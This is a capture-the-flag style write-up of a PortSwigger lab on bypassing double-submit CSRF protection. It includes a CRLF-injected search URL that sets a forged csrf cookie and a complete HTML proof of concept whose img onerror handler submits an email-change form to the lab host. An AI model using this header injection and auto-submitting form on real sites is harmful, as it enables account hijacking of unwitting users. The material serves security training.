![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/98ba2d55-4c37-4dbc-8940-a2d54f45a06e)

### Solution

![Screenshot 2024-04-17 151717](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/f6f62b3b-af44-4bfd-be89-e5242aa5f87d)

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/0f43510b-c8e0-439a-b1c0-a468a9f5597f)

we can observe that the value of the csrf body parameter is simply being validated by comparing it with the csrf cookie.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/5f0938fd-eaec-435b-890f-2215ad9ef857)

As soon as an adversary is able to set cookie values, the CSRF-protection can be circumvented entirely.The token may or may not require the proper format. So we can try using arbitary values

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/7922cce8-929d-44f9-a5a1-662ecca69d7b)

it worked succesfully

Perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/708d1902-a6ad-49aa-9a95-9c8bedd198e0)

Create a URL that uses this vulnerability to inject a fake csrf cookie into the victim's browser:

```js
/?search=hello%0d%0aSet-Cookie:%20csrf=test
```

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/f7b97b77-2313-4257-99df-10b17842f1a3)

To create the exploit, I use the CSRF PoC generator of Burp Suite.And remove the auto-submit <script> block and instead add the following code to inject the cookie and submit the form

```js
 <img src="https://0a9f0069041b0a4584abeaec005b006e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=anytoken%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

final payload

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a9f0069041b0a4584abeaec005b006e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="rahul&#64;user&#46;net" />
      <input type="hidden" name="csrf" value="anytoken" />
      <input type="submit" value="Submit request" />
    </form>
      <img src="https://0a9f0069041b0a4584abeaec005b006e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=anytoken%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/3b221986-da3b-4331-a843-1c708d10c206)

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/5db7795a-feea-4035-a5fe-e1f8e8270b9a)

lab solved succesfully
